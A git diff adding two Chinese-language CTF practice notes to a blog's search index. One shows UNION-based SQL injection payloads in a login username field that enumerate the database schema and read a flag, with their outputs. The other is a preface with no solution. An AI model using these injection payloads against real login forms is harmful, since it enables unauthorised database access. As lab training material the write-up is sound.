@@ -4,6 +4,64 @@
   
     
     <entry>
+      <title>刷题笔记:October 2019 Twice SQL Injection</title>
+      <link href="/p/3288058269.html"/>
+      <url>/p/3288058269.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[二次注入]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-October-2019-Twice-SQL-Injection/image-20210830185028272.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>还在change那里试了半天，没想到注入点竟然在登录。应该多试试的唉。</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">username &#x3D;1&#39; union select database() #username &#x3D;1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; # username &#x3D;1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;# username &#x3D;1&#39; union select flag from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据库</p><pre class="line-numbers language-none"><code class="language-none">ctftraining<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表</p><pre class="line-numbers language-none"><code class="language-none">flag,news,users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列</p><pre class="line-numbers language-none"><code class="language-none">flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;934730c7-4ab2-406b-9c62-819bc6c4e1c6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>刷题笔记:[pasecactf_2019]flask_ssti</title>
+      <link href="/p/3827587528.html"/>
+      <url>/p/3827587528.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-pasecactf-2019-flask-ssti/image-20210830183538531.png"></p><p>这靶机怎么回事，刷新一下半分钟，点GO半天都没点反应，无语了，回学校在做吧。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> SSTI </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>刷题笔记:[GKCTF 2021]easycms</title>
       <link href="/p/3674030718.html"/>
       <url>/p/3674030718.html</url>
